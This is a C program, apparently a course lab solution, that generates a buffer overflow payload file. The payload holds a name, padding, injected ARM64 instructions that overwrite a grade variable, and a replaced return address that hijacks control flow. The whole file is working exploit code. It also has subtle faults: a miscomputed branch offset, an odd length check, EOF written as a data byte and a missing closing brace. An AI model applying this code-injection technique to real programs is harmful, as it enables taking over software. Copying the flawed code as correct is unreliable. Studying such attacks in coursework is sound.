
#include <stdio.h>
#include "miniassembler.h"

/* Constants defining buffer size and relevant addresses */
enum {
    BUFFER_SIZE = 48,
    GRADE_ADDRESS = 0x420044,
    PRINT_ADDRESS = 0x400864,
    INSTRUCTION_COUNT = 17
};

/* 
   Creates a buffer overflow file named dataA that sets the grade to 'A'.
   It writes the name "Anish Solo" followed by padding and specific
   machine instructions to overwrite the grade variable.
   Returns 0 on successful creation, 1 otherwise.
*/
int main(void) {
    int byteCount = 0;
    unsigned long currentAddress = 0x420058;
    unsigned int instruction;
    FILE *filePtr = fopen("dataA", "w");

    /* Verify that the file was opened successfully */
    if (!filePtr) {
        perror("Error opening file");
        return 1;
    }

    /* Write the name "Anish Solo" to dataA */
    fputs("Anish Solo", filePtr);
    byteCount += 10; /* "Anish Solo" consists of 10 characters */

    /* Ensure the name does not exceed the buffer limit */
    if (byteCount == BUFFER_SIZE - INSTRUCTION_COUNT) {
        fprintf(stderr, "Name exceeds buffer capacity\n");
        fclose(filePtr);
        return 1;
    }

    /* Append a null terminator to the name */
    fputc('\0', filePtr);
    byteCount++;
    currentAddress += byteCount;

    /* Align the current address to a 4-byte boundary */
    while (currentAddress % 4 != 0) {
        fputc(0, filePtr);
        byteCount++;
        currentAddress++;
    }

    /* Generate and write the MOV instruction to set w0 to 'A' */
    instruction = MiniAssembler_mov(0, 'A');
    fwrite(&instruction, sizeof(unsigned int), 1, filePtr);
    byteCount += sizeof(unsigned int);

    /* Generate and write the ADR instruction to load GRADE_ADDRESS into x1 */
    instruction = MiniAssembler_adr(1, GRADE_ADDRESS, currentAddress + sizeof(unsigned int));
    fwrite(&instruction, sizeof(unsigned int), 1, filePtr);
    byteCount += sizeof(unsigned int);

    /* Generate and write the STRB instruction to store 'A' from w0 into grade */
    instruction = MiniAssembler_strb(0, 1);
    fwrite(&instruction, sizeof(unsigned int), 1, filePtr);
    byteCount += sizeof(unsigned int);

    /* Generate and write the B instruction to branch to PRINT_ADDRESS */
    instruction = MiniAssembler_b(PRINT_ADDRESS, currentAddress + 2 * sizeof(unsigned int));
    fwrite(&instruction, sizeof(unsigned int), 1, filePtr);
    byteCount += sizeof(unsigned int);

    /* Fill the remaining buffer with zeros to reach BUFFER_SIZE */
    while (byteCount < BUFFER_SIZE) {
        fputc(0, filePtr);
        byteCount++;
    }

    /* Overwrite the return address with currentAddress to manipulate control flow */
    fwrite(&currentAddress, sizeof(unsigned long), 1, filePtr);

    /* End the file */
    fputc(EOF, filePtr);
    fclose(filePtr);

    return 0;